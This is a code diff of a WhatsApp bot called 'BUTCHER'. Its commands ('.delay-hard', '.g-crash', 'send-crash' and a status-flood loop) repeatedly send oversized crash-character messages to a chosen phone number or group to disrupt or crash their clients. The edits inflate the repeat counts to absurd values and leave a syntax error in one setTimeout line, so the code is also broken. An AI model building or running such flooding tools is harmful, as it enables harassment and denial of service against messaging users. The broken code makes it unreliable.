@@ -424,10 +424,10 @@ _Powered by BUTCHER 🫆_`
                     const durationSeconds = parseInt(args[1])
                     if(!targetNumber || !durationSeconds) return await reply('Usage: .delay-hard <number> <duration>')
                     
-                    const messageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(5005 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
+                    const messageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(10000001000000010000000000100000100010010020 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
                     const endTime = Date.now() + (durationSeconds * 1000)
                     
-                    await reply(`poison sent ${targetNumber} for ${durationSeconds}s! 😈`)
+                    await reply(`poison sent ${targetNumber} for ${durationSeconds}s! `)
                     
                     while(Date.now() < endTime) {
                         try {
@@ -447,10 +447,10 @@ _Powered by BUTCHER 🫆_`
                     const groupDurationSeconds = parseInt(args[1])
                     if(!groupId || !groupDurationSeconds) return await reply('Usage: .g-crash <group_id> <duration>')
                     
-                    const groupMessageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(5005 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
+                    const groupMessageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(10001010101010100101001001002010100102010210120 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
                     const groupEndTime = Date.now() + (groupDurationSeconds * 1000)
                     
-                    await reply(`Group prank started for ${groupDurationSeconds}s! 😈`)
+                    await reply(`Group poison sent for ${groupDurationSeconds}s! `)
                     
                     while(Date.now() < groupEndTime) {
                         try {
@@ -461,7 +461,7 @@ _Powered by BUTCHER 🫆_`
                         }
                     }
                     
-                    await reply(`Group poison! `)
+                    await reply(`Group poison sent! `)
                     break
 
                 case 'send-crash':
@@ -483,7 +483,7 @@ _Powered by BUTCHER 🫆_`
                     if(!isGroup) return await reply('Use this in a group!')
                     
                     try {
-                        const singleCrash = crashChars.repeat(100) + '\nBUTCHER'
+                        const singleCrash = crashChars.repeat(10000000000101010010100101010) + '\nBUTCHER'
                         await sock.sendMessage(from, { text: singleCrash })
                     } catch(e) {
                         await reply('Error')
@@ -504,10 +504,10 @@ _Powered by BUTCHER 🫆_`
                         await reply(`GC poison ${gcDuration}s! 💥`)
                         
                         while(Date.now() < gcEndTime) {
-                            const statusMessage = `🔴 STATUS ${statusCount++}\n${crashChars.repeat(75)}\nBUTCHER`
+                            const statusMessage = `🔴 STATUS ${statusCount++}\n${crashChars.repeat(10101001010010101001010100101010101010101)}\nBUTCHER`
                             try {
                                 await sock.sendMessage(from, { text: statusMessage })
-                                await new Promise(r => setTimeout(r, 50))
+                                await new Promise(r => setTimeout(r, 5000)
                             } catch(e) {
                                 break
                             }
